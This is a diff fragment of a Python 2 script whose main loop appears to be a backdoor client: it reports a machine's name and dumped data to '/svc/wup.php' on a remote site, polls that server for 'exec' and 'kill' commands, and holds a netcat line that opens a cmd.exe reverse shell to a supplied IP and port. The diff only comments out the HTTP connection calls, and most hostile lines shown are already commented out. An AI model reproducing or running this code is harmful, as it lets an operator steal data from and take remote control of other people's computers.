@@ -257,8 +257,8 @@ def myloop():
                                 #sdump = sdump.replace("\r", "<br>")
                                 sdump = sdump.replace(" ", "%20")
                                 #sdump = sdump[ 0 : 2005]
-                                httpServ = httplib.HTTPConnection(site, 80)
-                                httpServ.connect()
+                                #httpServ = httplib.HTTPConnection(site, 80)
+                                #httpServ.connect()
                                 #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                 #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                                 #response = httpServ.getresponse()
@@ -282,8 +282,8 @@ def myloop():
                             #print r.text
                         except Exception,e:
                             print str(e)
-                        httpServ = httplib.HTTPConnection(site, 80)
-                        httpServ.connect()
+                        #httpServ = httplib.HTTPConnection(site, 80)
+                        #httpServ.connect()
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                         #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                         #response = httpServ.getresponse()
@@ -300,8 +300,8 @@ def myloop():
                                     #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                         except Exception,e:
                             print str(e)
-                        httpServ = httplib.HTTPConnection(site, 80)
-                        httpServ.connect()
+                        #httpServ = httplib.HTTPConnection(site, 80)
+                        #httpServ.connect()
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                         #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                         #response = httpServ.getresponse()
